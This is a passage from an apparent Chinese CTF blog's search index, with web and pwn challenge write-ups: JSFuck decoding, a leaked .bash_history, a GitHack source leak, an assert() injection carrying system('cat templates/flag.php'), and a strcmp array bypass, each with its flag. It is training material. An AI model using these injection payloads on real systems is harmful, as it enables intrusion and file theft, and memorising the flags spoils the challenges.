esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。④flag{g54dwqdqw-f43csad-saDWqd23wdasxsaxdFDWEVC}]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[俄罗斯方块（GG）]]></title>
    <url>%2F2017%2F12%2F30%2F%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88GG%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;①查看元素有一个tetris.js的文件②在线代码美化根据题目分数大于1000000分偷懒查找score ③发现有个 “webqwer” [1] + “100.js”webqwer[1]就是e④http://218.76.35.75:65380/e100.js又是[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]这种代码⑤在控制台复制粘贴加执行跳出对话框，里面有flag flag{oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk}]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮综合题]]></title>
    <url>%2F2017%2F12%2F30%2F%E5%8D%97%E9%82%AE%E7%BB%BC%E5%90%88%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;1、打开网页是 jother编码 *jother编码：JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的jother是另类的javascript工具一堆+!的东西就用jother解码可以打开谷歌浏览器 按F12然后console将那堆解码的东西复制过去 按回车即可解码2、在谷歌浏览器中的console中复制粘贴代码，回车解码得到1bc29b36f623ba82aaf6724fd3b16718.php将http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php改成http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 显示：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里(▼へ▼メ)给了提示，要看tip3、当前页面http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php查看tip（在network里的headers里查看有个history of bash） *history of bash：默认情况下，历史命令是存储在~/.bash_history文件里 4、找/.bash_histroy文件http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history找到一个压缩包zip -r flagbak.zip ./* 用URL=http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip自动下载，下载完解压找到flagflag is:nctf{bash_history_means_what}]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[babyphp]]></title>
    <url>%2F2017%2F12%2F30%2Fbabyphp%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;1、查看源码： 可以发现一共有三个page：home，about，contact还有一个可能存在的page：flag.php2、http://web.jarvisoj.com:32798/?page=flag.php显示：That file doesn’t exist!3、查看about里面有：PHP，GIT,Bootstrap可能有源码泄露，联系到about中有Git，使用GitHack下载源码4、使用GitHash下载源码方法：cmd，并切换到已经下载GitHash-master的py文件目录下python GitHash.py url.gitpython GitHash.py http://web.jarvisoj.com:32798/.git 显示有index.php，about.php，contact.php，flag.php，home.php在GitHash-master的目录下可以找到一个web.jarvisoj.com_32798的文件夹里面有templates和index.php文件*Templates文件夹：该文件夹中存储着常用程序的模板文件，如winword.doc、powerpnt.ppt、excel.xls等。模板就是包含有段落结构、字体样式和页面布局等元素的样式。它决定了文档的基本结构和设置的样式。5、查看了flag.php：&lt;?php// TODO//$FLAG = ‘’;?&gt;6、最后查看index.php：&lt;?phpif (isset($_GET[‘page’])){ $page = $_GET[‘page’];}else {$page = “home”;}$file = “templates/“ . $page . “.php”;assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);?&gt;/PHP assert()assert — 检查一个断言是否为 FALSEPHP 5bool assert ( mixed $assertion [, string $description ] )PHP 7bool assert ( mixed $assertion [, Throwable $exception ] )assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。断言这个功能应该只被用来调试。你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。断言不应该用于普通运行时操作，类似输入参数的检查。作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！/其实真看不懂什么意思 ψ(._.)&gt; 谁来教我php中assert本来是用于调试的，如果assert方法内的代码不为true，则给个Warning提醒。如下面的代码：&lt;?php assert(‘1==2’); ?&gt;执行后会有如下输出： Warning: assert(): Assertion “1==2” failed in D:\green\APMServ5.2.6\www\htdocs\phpinfo.php on line 2 有个assert_option方法可以对assert进行一些控制。7、构造assert()函数会运行接收的语句 http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls templates/;”).’显示：about.phpcontact.phpflag.phphome.phpabout.phpcontact.phpflag.phphome.phpThat file doesn’t exist! http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False and system(‘cat templates/flag.php’);//显示：&lt;?php// TODO//$FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}’;?&gt;That file doesn’t exist!‘,’..’)===False根据assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”)‘,’..’)===False为真system(‘cat templates/flag.php’)显示flag.php的内容*system()函数system — 执行外部程序，并且显示输出string system ( string $command [, int &amp;$return_var ] )参数command要执行的命令。return_var如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。返回值成功则返回命令输出的最后一行， 失败则返回 FALSEFLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[checkpass]]></title>
    <url>%2F2017%2F12%2F30%2Fcheckpass%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;查看源码&lt;?php$pass=@$_POST[‘pass’];$pass1=;//被隐藏起来的密码if(isset($pass)){if(@!strcmp($pass,$pass1)){echo “flag:nctf{}”;}else{echo “the pass is wrong!”;}}else{echo “please input pass!”;}?&gt;php的strcmp函数，传入一个array就好了strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。如果传入给出strcmp()的参数是数字呢？$array=[1,2,3];var_dump(strcmp($array,’123’)); //null,在某种意义上null也就是相当于false。http://chinalover.sinaapp.com/web21/使用hackbar插件load URL：http://chinalover.sinaapp.com/web21/index.phppost data：pass[]=1 //传入一个数组]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在命令行里运行python脚本]]></title>
    <url>%2F2017%2F12%2F30%2F%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%87%8C%E8%BF%90%E8%A1%8Cpython%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[&lt; !–more–&gt;打开文本编辑器，notepad语言设置成python脚本第一行一定要写上 #! /usr/bin/env python编辑好之后，将文件保存成 .py格式cd 到运行文件所在目录运行python 文件名.pycmd命令行中输入 python把脚本文件拖拽到当前光标位置，回车报错：File ““ , line 1python hello.pySyntaxError：invalid synta原因：Python命令行中，运行Python代码“python hello.py”是一个脚本命令，不是python代码]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F12%2F30%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
